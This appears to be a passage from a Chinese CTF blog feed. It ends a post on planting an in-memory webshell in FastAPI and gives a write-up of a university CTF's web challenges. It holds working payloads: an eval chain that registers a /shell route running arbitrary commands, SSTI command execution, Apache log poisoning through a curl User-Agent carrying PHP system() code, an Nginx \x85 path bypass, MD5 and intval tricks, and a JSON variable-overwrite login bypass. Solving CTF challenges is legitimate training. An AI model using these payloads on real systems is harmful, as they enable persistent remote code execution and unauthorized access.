DefaultPlaceholder] = Default(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="params">        JSONResponse</span></span></span><br><span class="line"><span class="params"><span class="params">    </span>),</span></span><br><span class="line"><span class="params">    name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    route_class_override: <span class="type">Optional</span>[<span class="type">Type</span>[APIRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    callbacks: <span class="type">Optional</span>[<span class="type">List</span>[BaseRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    openapi_extra: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    generate_unique_id_function: <span class="type">Union</span>[</span></span><br><span class="line"><span class="params">        <span class="type">Callable</span>[[APIRoute], <span class="built_in">str</span>], DefaultPlaceholder</span></span><br><span class="line"><span class="params">    ] = Default(<span class="params">generate_unique_id</span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    route_class = route_class_override <span class="keyword">or</span> <span class="variable language_">self</span>.route_class</span><br><span class="line">    responses = responses <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    combined_responses = &#123;**<span class="variable language_">self</span>.responses, **responses&#125;</span><br><span class="line">    current_response_class = get_value_or_default(</span><br><span class="line">        response_class, <span class="variable language_">self</span>.default_response_class</span><br><span class="line">    )</span><br><span class="line">    current_tags = <span class="variable language_">self</span>.tags.copy()</span><br><span class="line">    <span class="keyword">if</span> tags:</span><br><span class="line">        current_tags.extend(tags)</span><br><span class="line">    current_dependencies = <span class="variable language_">self</span>.dependencies.copy()</span><br><span class="line">    <span class="keyword">if</span> dependencies:</span><br><span class="line">        current_dependencies.extend(dependencies)</span><br><span class="line">    current_callbacks = <span class="variable language_">self</span>.callbacks.copy()</span><br><span class="line">    <span class="keyword">if</span> callbacks:</span><br><span class="line">        current_callbacks.extend(callbacks)</span><br><span class="line">    current_generate_unique_id = get_value_or_default(</span><br><span class="line">        generate_unique_id_function, <span class="variable language_">self</span>.generate_unique_id_function</span><br><span class="line">    )</span><br><span class="line">    route = route_class(</span><br><span class="line">        <span class="variable language_">self</span>.prefix + path,</span><br><span class="line">        endpoint=endpoint,</span><br><span class="line">        response_model=response_model,</span><br><span class="line">        status_code=status_code,</span><br><span class="line">        tags=current_tags,</span><br><span class="line">        dependencies=current_dependencies,</span><br><span class="line">        summary=summary,</span><br><span class="line">        description=description,</span><br><span class="line">        response_description=response_description,</span><br><span class="line">        responses=combined_responses,</span><br><span class="line">        deprecated=deprecated <span class="keyword">or</span> <span class="variable language_">self</span>.deprecated,</span><br><span class="line">        methods=methods,</span><br><span class="line">        operation_id=operation_id,</span><br><span class="line">        response_model_include=response_model_include,</span><br><span class="line">        response_model_exclude=response_model_exclude,</span><br><span class="line">        response_model_by_alias=response_model_by_alias,</span><br><span class="line">        response_model_exclude_unset=response_model_exclude_unset,</span><br><span class="line">        response_model_exclude_defaults=response_model_exclude_defaults,</span><br><span class="line">        response_model_exclude_none=response_model_exclude_none,</span><br><span class="line">        include_in_schema=include_in_schema <span class="keyword">and</span> <span class="variable language_">self</span>.include_in_schema,</span><br><span class="line">        response_class=current_response_class,</span><br><span class="line">        name=name,</span><br><span class="line">        dependency_overrides_provider=<span class="variable language_">self</span>.dependency_overrides_provider,</span><br><span class="line">        callbacks=current_callbacks,</span><br><span class="line">        openapi_extra=openapi_extra,</span><br><span class="line">        generate_unique_id_function=current_generate_unique_id,</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">self</span>.routes.append(route)</span><br></pre></td></tr></table></figure><p>不用全部看懂，只需要知道这个<code>add_api_route</code>可以用来添加路由就好了！构造payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;sys.modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>[&#x27;app&#x27;].router.add<span class="built_in">_</span>api<span class="built_in">_</span>route(&#x27;/shell&#x27;,lambda cmd=&#x27;whoami&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(cmd).read(),methods=[&#x27;GET&#x27;])&quot;)</span><br></pre></td></tr></table></figure><p>这样就好了！我测过打通了！</p><p><del>未完待续</del></p>]]></content>
      
      
      <categories>
          
          <category> python内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
            <tag> fastapi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都大学第八届玄武杯（ak）</title>
      <link href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"/>
      <url>/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><p>查看源码发现&#x2F;try_a_try</p><p><img src="/images/achieve/2025/11/1.png"></p><p>直接猜参数是name果真！果然也是ssti直接秒了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try<span class="built_in">_</span>a<span class="built_in">_</span>try?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;tac /f*&#x27;).read()&#125;&#125;</span><br><span class="line">NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>这题就不分析代码了，?page&#x3D;&#x2F;flag就直接秒了！有个加强版的，待会直接就在那题分析代码了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;216a17fb-19f6-49e7-863b-bd0eb63d86b7&#125;</span><br></pre></td></tr></table></figure><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;记住这个数&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;这都记不住?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我不想要这个数字!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想十六进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想八进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好了你可以去下一关了&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我现在又想要了,嘻嘻&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不er,md5你不会&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你看看传什么呢&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str($a,$b);</code>将字符串$a解析成数组存入$b</p><p><code>if(strpos($num2, &quot;0&quot;))</code>0在第一位返回的就是0，所以可以直接8进制绕过</p><p>payload（&amp;要url编码不然就会被认为是参数分割符）</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=cdusec=QNKCDZO<span class="comment">%26num[]=10520%26num[]=0337522</span></span><br><span class="line">post:</span><br><span class="line">c=240610708</span><br></pre></td></tr></table></figure><p>第二关&#x2F;leeevvvel2222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag在/flag中，试着读读?</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪协议都用不了有waf，那就日志包含，apache服务器</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.log之前一直以为是这个，但是查了一下现在不是了</span><br><span class="line">/var/log/apache2/access.log是这个，直接打就行了</span><br><span class="line">curl -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node10.anna.nssctf.cn:22383/leeevvvel2222222.php&quot;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;4c29beda-b185-46bc-9fb2-efccf4b193b9&#125;</span><br></pre></td></tr></table></figure><h2 id="眼见不一定为实"><a href="#眼见不一定为实" class="headerlink" title="眼见不一定为实"></a>眼见不一定为实</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/secret&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>直接访问403禁止看下题目</p><p><img src="/images/achieve/2025/11/2.png"></p><p>Nginx 和 Python 对 URL 路径的解析方式可能不同，意思就是让我们弄个路径Nginx不能解析成&#x2F;secret，但是python可以解析成&#x2F;secret</p><p>上网查了一下还真有<a href="https://xz.aliyun.com/news/18629">Nginx 路径绕过-先知社区</a></p><p>nginx.config</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server<span class="built_in">_</span>name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/?<span class="built_in">$</span> &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy<span class="built_in">_</span>pass http://127.0.0.1:8080;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header Host <span class="built_in">$</span>host;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Real-IP <span class="built_in">$</span>remote<span class="built_in">_</span>addr;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-For <span class="built_in">$</span>proxy<span class="built_in">_</span>add<span class="built_in">_</span>x<span class="built_in">_</span>forwarded<span class="built_in">_</span>for;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-Proto <span class="built_in">$</span>scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nginx 配置的核心访问控制部分，我们看看它是怎么处理的可以看到它用正则匹配了所有的&#x2F;secret后面加或者不加任何东西，但是一些特殊的字符匹配不到，比如不可见字符\x85</p><p><img src="/images/achieve/2025/11/3.png"></p><p>改成85发包即可！</p><h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p>开局就登录页面，扫出个&#x2F;<a href="http://www.zip/">www.zip</a></p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#悄悄的，校内赛道第一个找到学长的秘密的私信学长秘密内容给奶茶喝</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果是普通表单请求</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>肯定是想法子登录进去<code>$client_ip = $_SERVER[&#39;REMOTE_ADDR&#39;]</code>这玩意获取用户ip地址，即使知道账号密码也登录不进去！然后普通用户登录给我跳回来了，直接看index.php果然是<code>$_SESSION[&#39;role&#39;]</code></p><p>那不就正好用上了第一个if进行变量覆盖了吗，直接一次性覆盖三个变量</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>然后就登录上去了</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: 